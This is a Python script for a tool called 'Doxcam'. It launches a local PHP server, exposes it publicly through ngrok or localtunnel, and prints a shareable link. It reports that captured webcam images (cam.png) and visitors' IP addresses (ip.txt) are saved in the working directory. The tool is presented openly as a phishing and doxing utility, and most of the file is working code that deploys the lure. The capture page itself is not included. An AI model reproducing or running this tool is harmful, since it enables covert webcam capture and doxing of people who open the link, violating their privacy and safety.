import os
import time
import subprocess

def loading():
    for _ in range(3):
        os.system('cls' if os.name == 'nt' else 'clear') 
        print(r"""
             .======.
             | INRI |
             |      |
             |      |
    .========'      '========.
    |   _      xxxx      _   |
    |  /_;-.__ / _\  _.-;_\  |
    |     `-._`'`_/'`.-'     |
    '========.`\   /`========'
             | |  / |
             |/-.(  |    Philippians 4:13
             |\_._\ |
             | \ \`;|
             |  > |/|
             | / // |
             | |//  |
             | \(\  |
             |  ``  |
             |      |
             |      |
             |      |
             |      |
 \\jgs _  _\\| \//  |//_   _ \// _
^ `^`^ ^`` `^ ^` ``^^`  `^^` `^ `^
            """)
        time.sleep(0.5)
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)
    
def Doxcam():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r"""
    ____                                
   / __ \____  _  ___________ _____ ___ 
  / / / / __ \| |/_/ ___/ __ `/ __ `__ \  
 / /_/ / /_/ />  </ /__/ /_/ / / / / / /  
/_____/\____/_/|_|\___/\__,_/_/ /_/ /_/    

    [+] Version | 1.0
    [+] Author  | cybermad
    [*] Github  | https://github.com/madanokr001
    [*] Discrod | cybermad.cpp           
          
    [01] | ngrok
    [02] | localtunnel
    [03] | Exit
""")


def main():
    while True:
        loading()
        Doxcam()
        select = input(f"""
┌──(root@Doxcam)-[/home/root]
└─# """)
                                        
        if select == "1":
            def php(port):
                os.system(f"php -S 127.0.0.1:{port} > /dev/null 2>&1 &")
                time.sleep(1)

            def ngrok(port):
                os.system(f"ngrok http {port} > /dev/null 2>&1 &")
                time.sleep(5)

            def fetch():
                try:
                    result = subprocess.check_output("curl -s http://127.0.0.1:4040/api/tunnels", shell=True).decode()
                    for line in result.split('"'):
                        if line.startswith("https://"):
                            return line
                except:
                    return None

            def ngroks():
                port = input("[+] Port > ") or "8000"

                php(port)
                ngrok(port)

                url = fetch()
                if url:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f"""
    ____                                
   / __ \____  _  ___________ _____ ___ 
  / / / / __ \| |/_/ ___/ __ `/ __ `__ \  
 / /_/ / /_/ />  </ /__/ /_/ / / / / / /   
/_____/\____/_/|_|\___/\__,_/_/ /_/ /_/                           
                          
    [+] Version | 1.0
    [+] Author  | cybermad
    [*] Github  | https://github.com/madanokr001
    [*] Discrod | cybermad.cpp              

    [+] Saved to here | {os.getcwd()} 
    [*] cam.png       | {os.getcwd()}   
    [*] ip.txt        | {os.getcwd()}        
                          """)
                    print(f"[*] Link: {url}")
                else:
                    print("[-] https://www.youtube.com/watch?v=mxDMdOlkoIo")
                    print("[-] https://dashboard.ngrok.com/get-started/your-authtoken")
                    print("[-] ngrok config add-authtoken YOURTOKENHERE")

                print("[*] Press Ctrl+C to exit.")

                try:
                    while True:
                        time.sleep(2)
                except KeyboardInterrupt:
                    os.system("pkill php")
                    os.system("pkill ngrok")
                    print("[-] :(")

            ngroks()

        elif select == "2":
            def php(port):
                os.system(f"php -S 127.0.0.1:{port} > /dev/null 2>&1 &")
                time.sleep(1)

            def localtunnel(port, subdomain):
                result = f"lt --port {port} --subdomain {subdomain}"
                proc = subprocess.Popen(result, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
                for line in iter(proc.stdout.readline, b''):
                    decoded = line.decode().strip()
                    print(decoded)
                    if "your url is:" in decoded:
                        return decoded.split("your url is: ")[-1]

            def lt():
                port = input("[+] Port > ") or "8000"
                subdomain = input("[*] Subdomain > ")

                php(port)
                url = localtunnel(port, subdomain)

                if url:
                    os.system('cls' if os.name == 'nt' else 'clear')
                    print(f"""
    ____                                
   / __ \____  _  ___________ _____ ___ 
  / / / / __ \| |/_/ ___/ __ `/ __ `__ \  
 / /_/ / /_/ />  </ /__/ /_/ / / / / / /   
/_____/\____/_/|_|\___/\__,_/_/ /_/ /_/                           
                          
    [+] Version | 1.0
    [+] Author  | cybermad
    [*] Github  | https://github.com/madanokr001
    [*] Discrod | cybermad.cpp   

    [+] Saved to here | {os.getcwd()} 
    [*] cam.png       | {os.getcwd()}   
    [*] ip.txt        | {os.getcwd()}          
                          """)
                    print(f"[*] Link: {url}")
                else:
                    print("[-] sudo apt install nodejs npm")
                    print("[-] sudo npm install -g localtunnel")

                print("[*] Press Ctrl+C to exit.")
                try:
                    while True:
                        time.sleep(2)
                except KeyboardInterrupt:
                    os.system("pkill php")
                    os.system("pkill lt")
                    print("[-] :(")
            
            lt()
                
    
             


if __name__ == "__main__":
    main()